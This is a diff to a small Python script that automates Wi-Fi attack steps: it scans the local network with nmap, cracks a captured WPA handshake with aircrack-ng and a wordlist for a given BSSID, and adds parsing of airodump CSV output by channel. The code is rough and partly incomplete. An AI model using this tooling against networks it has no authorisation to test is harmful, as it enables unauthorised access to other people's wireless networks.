@@ -1,6 +1,8 @@
 import subprocess
 import re
 from subprocess import check_output
+import csv 
+from itertools import islice
 
 #Runs ifconfig and gets ip address so NMAP can be performed
 def runIfconfig():
@@ -18,6 +20,7 @@ def runNMAP():
 	nmapResult = check_output(['nmap', ipaddress])
 	print(nmapResult.decode("utf-8"))
 
+#target takes in a bssid
 def runPasswordCracker(target):
 	passwordCrackerCmd = "aircrack-ng -w /usr/share/john/password.lst -b " + target + " test-02.cap"
 	passwordCrackerCmdArray = passwordCrackerCmd.split(' ')
@@ -25,3 +28,20 @@ def runPasswordCracker(target):
 	passwordCrackerResult = check_output(passwordCrackerCmdArray).decode("utf-8")
 	password = regex.search(passwordCrackerResult)
 	print(password.group(0))
+
+def read_bssid():
+	with open("test.csv", 'r') as fp:
+		reader = csv.reader(fp, delimiter=',', quotechar='"')
+		next(reader, None)
+		#data_read = [row for row in reader if len(row) == 15]
+		data_channel = {}
+		for row in islice(reader, 1, None):
+			if len(row) == 15:
+				channel = int(row[3])
+				print(channel)
+				if 0 <= channel:
+					if channel in data_channel: 
+						data_channel[channel].append(row)
+					else:
+						data_channel[channel] = [row]
+		print(data_channel[6])
